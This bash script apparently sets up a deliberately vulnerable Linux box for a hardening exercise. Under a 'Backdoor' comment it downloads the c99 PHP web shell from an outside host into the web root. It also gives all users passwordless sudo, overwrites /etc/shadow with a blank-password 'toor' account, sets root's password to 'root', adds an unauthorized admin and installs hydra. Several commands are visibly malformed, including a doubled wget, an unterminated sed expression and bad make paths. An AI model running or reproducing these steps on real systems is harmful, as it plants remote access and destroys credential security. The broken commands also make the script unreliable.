#!/bin/bash

# Backdoor
apt-get install apache2 apache2-npm php5
wget -O /var/www/c99.php wget http://r57shell.net/shell/c99.txt

# Sudoers
echo "ALL ALL=(ALL:ALL) NOPASSWD:ALL" > /etc/sudoers.d/all

# Max PW age
sed -i 's/^PASS_MAX_AGE/PASS_MAX_AGE\t99999' /etc/login.defs

# Hidden user
echo "toor::16426:0:99999:7:::" > /etc/shadow

# Insecure root pw
echo "root:root" | chpasswd

# Users
# Authorized admin
useradd -d /home/leon -G adm,sudo leon
useradd -d /home/jack -G adm,sudo jack
# Unauthorized admin
useradd -d /home/tyler -G adm,sudo tyler
# Authorized user
useradd -d /home/alex alex
useradd -d /home/connor connor
useradd -d /home/andrew andrew

# Install hydra
git clone https://github.com/vanhauser-thc/thc-hydra.git
./thc-hydra/configure
./thc-hydra/make
./thc-hydra/make install
rm -rf thc-hydra
which hydra

# Install ssh
apt-get install openssh-server

# Script dependencies
wget https://pypi.python.org/packages/source/s/simplepam/simplepam-0.1.5.tar.gz
tar xvf simplepam-0.1.5.tar.gz
cd simplepam-0.1.5
python setup.py install
cd ..
rm -rf simplepam-0.1.5

git clone https://github.com/giampaolo/psutil.git
cd psutil
python setup.py install
cd ..
rm -rf psutil

